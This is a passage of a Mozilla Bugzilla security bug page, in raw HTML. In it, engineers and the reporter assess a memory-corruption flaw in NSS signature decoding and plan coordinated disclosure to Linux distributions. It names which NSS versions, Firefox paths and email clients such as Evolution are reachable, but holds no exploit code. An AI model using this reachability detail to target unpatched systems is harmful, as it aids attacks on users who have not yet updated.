        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a701655_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_622637" id="a701655_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a701655_622637"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a701655_622637">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a701655_622637">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 10:53 PDT" data-time="1635789212">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bbeurdouche)</span></div></div></div><div class="change-set" id="a701673_622637"><div class="change" id="aa701673_622637">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_622637" id="a701673_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a701673_622637"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a701673_622637">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a701673_622637">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 10:53 PDT" data-time="1635789230">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(bbeurdouche)</div></div></div><div class="change-set" id="c50"><div class="comment" data-id="15638017" data-no="50"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-50" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a701673_622637"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-50"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-50" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c50">Comment 50</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 11:46 PDT" data-time="1635792393">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-50">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-50" data-comment-id="15638017"><p>The CryptoEng team have been looking at this for the past few days. We&#39;re still crossing the t&#39;s and dotting the i&#39;s but have some preliminary findings to share:</p>
<p><strong>DSA</strong><br>
We believe this was introduced in NSS 3.14, released October 2012. We&#39;ve tested 3.13.6 and 3.11.9 and neither appear to be vulnerable. Although the vulnerable code takes shape much earlier, the len parameter to <code>decodeECorDSASignature</code> is hardcoded to 40 until <a href="https://hg.mozilla.org/projects/nss/diff/10393/security/nss/lib/cryptohi/seckey.c#l1.63" rel="nofollow">revision 10393</a> / <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=475578">Bug 475578</a>.</p>
<p>Firefox removed support for DSA in TLS in 2014 and mozilla::pkix has never supported DSA certificates so it is not impacted. Similarly, the default NSS policies shipped with Ubuntu and Red Hat disable DSA. However, other users of NSS which haven&#39;t disabled DSA by policy are likely to be impacted.</p>
<p><strong>RSA-PSS</strong><br>
RSA-PSS support was introduced in NSS 3.34, released November 2017. Whilst RSA-PSS is used in Firefox, the impact appears to be quite limited:</p>
<ul>
<li>Update Signing - Not vulnerable, pinned to RSA PKCS #1.</li>
<li>Content Signing - Not vulnerable, pinned to ECDSA.</li>
<li>CRL, OCSP, Certificate Transparency - Not vulnerable, pinned to ECDSA and RSA PKCS #1.</li>
<li>TLS - Not vulnerable, moz::pkix doesn&#39;t support RSA-PSS certificates and the TLS implementation dispatches RSA-PSS signatures to <code>PK11_VerifyWithMechanism</code> which avoids the vulnerable code.</li>
<li>Addon Signing - Not vulnerable, but a close run. Starting from <a href="https://searchfox.org/mozilla-central/source/security/apps/AppSignatureVerification.cpp#1261" rel="nofollow">OpenSignedAppFile</a> the certificate chain is first verified by moz::pkix which doesn&#39;t accept RSA-PSS signatures. Consequently the signing key must be an RSA key provided by Mozilla of the correct size. So whilst an attacker can append an RSA-PSS signature to the addon, allegedly from the Mozilla-provided pubkey, the signature verification uses the public key provided length and so is not vulnerable.</li>
</ul>
<p>However, if a user manually imports a TLS Certificate (e.g. for client auth) via Settings-&gt;View Certificates-&gt;Import, it calls into <a href="https://searchfox.org/mozilla-central/source/security/manager/ssl/nsNSSCertificateDB.cpp#798" rel="nofollow">ImportPKCS12File</a> which will attempt to verify the imported file with either a hmac or <a href="https://searchfox.org/mozilla-central/source/security/nss/lib/pkcs12/p12d.c#1487" rel="nofollow">signature</a>.  We assume this is exploitable if the attacker can convince the user to manually install a malicious certificate.</p>
<p>As RSA-PSS is typically enabled by default, consumers of NSS as a library are almost certainly impacted. A non-comprehensive list of believed-vulnerable functions is attached. It includes CMS / SMIME, PKCS #7, PKCS #12, X.509, OCSP and CRL functionality.</p>
</div></div><div class="change-set" id="c51"><div class="comment" data-id="15638022" data-no="51"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-51" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a701673_622637"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-51"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-51" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c51">Comment 51</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 11:47 PDT" data-time="1635792445">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-51">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9248750"
         class="attachment"
         data-id="9248750" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="nss-vuln.txt">
      <meta itemprop="contentSize" content="851">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9248750" itemprop="contentUrl" >
        <span id="att-9248750-description" itemprop="description">nss-vuln-functions.txt</span></a>
        â€” <a href="attachment.cgi?id=9248750&amp;action=edit" itemprop="url" data-details="1">Details</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body empty"
      id="ct-51" data-comment-id="15638022"></div></div><div class="change-set" id="c52"><div class="comment" data-id="15638123" data-no="52"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-52" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a701673_622637"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-52"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-52" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c52">Comment 52</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 13:20 PDT" data-time="1635798007">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-52">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-52" data-comment-id="15638123"><p>Bob:</p>
<p>There&#39;s another email client that uses NSS for S/MIME and is vulnerable, too. I&#39;ve just tested that Gnome Evolution on Linux crashes with Tavis&#39; test email, and it crashes below the call to CERT_VerifyCert (in VFY_Begin).</p>
</div></div><div class="change-set" id="c53"><div class="comment" data-id="15638137" data-no="53"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-53" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a701673_622637"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-53"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-53" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c53">Comment 53</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 13:28 PDT" data-time="1635798515">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-53">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-53" data-comment-id="15638137"><p>Regarding Evolution, I just read <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c50" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 50</a> from Dennis. If RHEL disables DSA, then Evolution on RHEL is likely not affected.</p>
<p>However, other Linux distributions that ship Evolution are affected. I&#39;ve tested on Debian.</p>
</div></div><div class="change-set" id="c54"><div class="comment" data-id="15638257" data-no="54"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-54" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a701673_622637"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-54"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-54" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c54">Comment 54</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-01 15:05 PDT" data-time="1635804307">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-54">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-54" data-comment-id="15638257"><p>(In reply to Dennis Jackson from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c50" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #50</a>)</p>
<blockquote>
<p>The CryptoEng team have been looking at this for the past few days. We&#39;re still crossing the t&#39;s and dotting the i&#39;s but have some preliminary findings to share:</p>
</blockquote>
<p>Thanks for the analysis - I would like to clarify what is the planned timeline for external notification? I understand Mozilla has things under control, but I worry about third parties. My first choice would be to notify the <a href="https://oss-security.openwall.org/wiki/mailing-lists/distros" rel="nofollow">distros</a> list - but there is a <strong>maximum</strong> embargo of 14 days.</p>
<p>(In reply to Kai Engert (:KaiE:) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c53" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #53</a>)</p>
<blockquote>
<p>Regarding Evolution, I just read <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c50" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 50</a> from Dennis. If RHEL disables DSA, then Evolution on RHEL is likely not affected.</p>
</blockquote>
<p>I think RSA-PSS will still work though...</p>
</div></div><div class="change-set" id="c55"><div class="comment" data-id="15638810" data-no="55"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-55" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a701673_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-55"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-55" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c55">Comment 55</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-02 05:06 PDT" data-time="1635854770">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-55">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-55" data-comment-id="15638810"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c54" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #54</a>)</p>
<blockquote>
<p>Thanks for the analysis - I would like to clarify what is the planned timeline for external notification? I understand Mozilla has things under control, but I worry about third parties. My first choice would be to notify the <a href="https://oss-security.openwall.org/wiki/mailing-lists/distros" rel="nofollow">distros</a> list - but there is a <strong>maximum</strong> embargo of 14 days.</p>
</blockquote>
<p>As I just released NSS 3.72 (2021-10-28), and looking at the calendar [0], there are two releases that could work well for landing this fix:<br>
NSS 3.73 on 2021-12-02  - or - NSS 3.74 on 2022-01-06.</p>
<p>I currently lean towards aiming at NSS 3.73 which leaves us with 4 weeks to take additional disclosure actions.<br>
In that scenario, we could notify the distros list on November 22nd (10 days prior the release).<br>
Does that seem reasonable?</p>
<p>[0] <a href="https://wiki.mozilla.org/NSS:Release_Versions#Future_Releases" rel="nofollow">https://wiki.mozilla.org/NSS:Release_Versions#Future_Releases</a></p>
</div></div><div class="change-set" id="c56"><div class="comment" data-id="15638821" data-no="56"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-56" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a701673_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-56"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-56" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c56">Comment 56</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-02 05:14 PDT" data-time="1635855281">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-56">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-56" data-comment-id="15638821"><p>Disclosure to Apple: Bailey reached out to me by email on 2021-11-01 to confirm that Apple is not affected by these bugs.</p>
</div></div><div class="change-set" id="c57"><div class="comment" data-id="15638888" data-no="57"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-57" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a701673_622637"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a701673_622637"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-57"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-57" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c57">Comment 57</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-02 06:24 PDT" data-time="1635859490">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-57">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-57" data-comment-id="15638888"><p>(In reply to Benjamin Beurdouche [:beurdouche] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c55" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #55</a>)</p>
<blockquote>
<p>I currently lean towards aiming at NSS 3.73 which leaves us with 4 weeks to take additional disclosure actions.<br>
In that scenario, we could notify the distros list on November 22nd (10 days prior the release).<br>
Does that seem reasonable?</p>
</blockquote>
<p>Very reasonable, thanks!</p>
</div></div><div class="change-set" id="a783068_11099"><div class="change" id="aa783068_11099">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_11099" id="a783068_11099"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a783068_11099"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a783068_11099">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a783068_11099">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-02 09:30 PDT" data-time="1635870625">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(rrelyea)</span></div></div></div><div class="change-set" id="c58"><div class="comment" data-id="15641993" data-no="58"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-58" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a783068_11099"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-58"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-58" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c58">Comment 58</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-04 03:15 PDT" data-time="1636020933">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1737470&amp;comment_id=15641993"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-58">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-58" data-comment-id="15641993"><p>I don&#39;t know if the following is necessary, but here are my thoughts and questions:</p>
<p>(In reply to Benjamin Beurdouche [:beurdouche] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c55" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #55</a>)</p>
<blockquote>
<p>As I just released NSS 3.72 (2021-10-28), and looking at the calendar [0], there are two releases that could work well for landing this fix:<br>
NSS 3.73 on 2021-12-02  - or - NSS 3.74 on 2022-01-06.</p>
<p>I currently lean towards aiming at NSS 3.73 which leaves us with 4 weeks to take additional disclosure actions.<br>
In that scenario, we could notify the distros list on November 22nd (10 days prior the release).</p>
</blockquote>
<p>When do you intend to create the public commit?<br>
IIUC, you suggest: 2021-12-02</p>
<p>When do you intend to provide the NSS patch for the distro people?<br>
Do you need to do that on the day you announce it to the distro list?<br>
Or is it sufficient to do that by the end of the 14 day period?</p>
<p>As soon as you provide the patch to the distro people, you might see public package builds that contain the patch, so this is equivalent to publishing the fix, and therefore I think that you could publicly commit to NSS on the same day as giving to distro people.</p>
<p>Is it necessary to immediately release beta and esr91 immediately after you make the public commit?<br>
If yes, the suggested date 2021-12-02 may not be ideal, because it&#39;s too close to the scheduled release on 2021-12-07, and it might be a challenge for release engineering to handle two releases within a week.</p>
<p>Regardless of the timing for mozilla-central and a new NSS version, you might require at least two .x releases for stable NSS releases, for the one used by Firefox Beta, and for the one used by Firefox ESR 91.x.</p>
<p>[Edit]:<br>
<del>If you do it in the middle of the regular 4 week update cycle, then you don&#39;t need to immediately create the next NSS release, it&#39;s sufficient to have it in NSS trunk and in FF nightly.</del><br>
With the following schedule you&#39;d also require an additional NSS release for the latest FF release.</p>
<p>If the patch can be ready soon, then you could use the following schedule, assuming Firefox releng would agree with it, and also assuming that you can ask distros to delay building public packages until 2 days before the end of the 14 days period:</p>
<ul>
<li>
<p>2021-11-09: announce to distros list</p>
</li>
<li>
<p>2021-11-21:<br>
public commit to NSS, give patch to distro list,<br>
create release tags NSS 3.68.x, NSS 3.71.x, NSS 3.72.x</p>
</li>
<li>
<p>2021-11-23: release FF 94.0.x, FF Beta 95.x, FF ESR 91.3.x,<br>
and announce the NSS 3.68.x, NSS 3.71.x and NSS 3.72.x releases</p>
</li>
</ul>
<p>Linux distributions will need to patch their older system NSS releases. For example Debian 10 uses NSS 3.42, and Ubuntu 20.04 uses NSS 3.49, Debian 11 uses NSS 3.61.</p>
<p>Updating NSS is the only known defense for Gnome Evolution, to protect it from being exploitable by received email.</p>
<p>Will the patch to NSS easily apply to all past versions? The answer to this influences how much time the distros need to prepare a merged NSS.</p>
<p>For the current WIP, it seems easy, the patch seems to directly apply to NSS 3.42.</p>
<p>[Edit]: Added need for 3.68.x</p>
</div></div><div class="change-set" id="c59"><div class="comment" data-id="15642001" data-no="59"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-59" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a783068_11099"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-59"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-59" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c59">Comment 59</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-04 03:22 PDT" data-time="1636021328">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-59">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-59" data-comment-id="15642001"><p>Previous comment edited</p>
</div></div><div class="change-set" id="c60"><div class="comment" data-id="15642337" data-no="60"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-60" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a783068_11099"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-60"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-60" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c60">Comment 60</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-04 06:46 PDT" data-time="1636033605">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-60">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-60" data-comment-id="15642337"><p>(In reply to Kai Engert (:KaiE:) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c58" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #58</a>)</p>
<blockquote>
<p>As soon as you provide the patch to the distro people, you might see public package builds that contain the patch, so this is equivalent to publishing the fix, and therefore I think that you could publicly commit to NSS on the same day as giving to distro people.</p>
</blockquote>
<p>I think there&#39;s no need to worry, the list members are used to handling embargoed security issues and they take this seriously. They will just make sure they have packages and advisories ready to for their users at the agreed upon date.</p>
<p>You can read about some of the policies <a href="https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-members" rel="nofollow">here</a>.</p>
</div></div><div class="change-set" id="c61"><div class="comment" data-id="15642365" data-no="61"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-61" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a783068_11099"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-61"
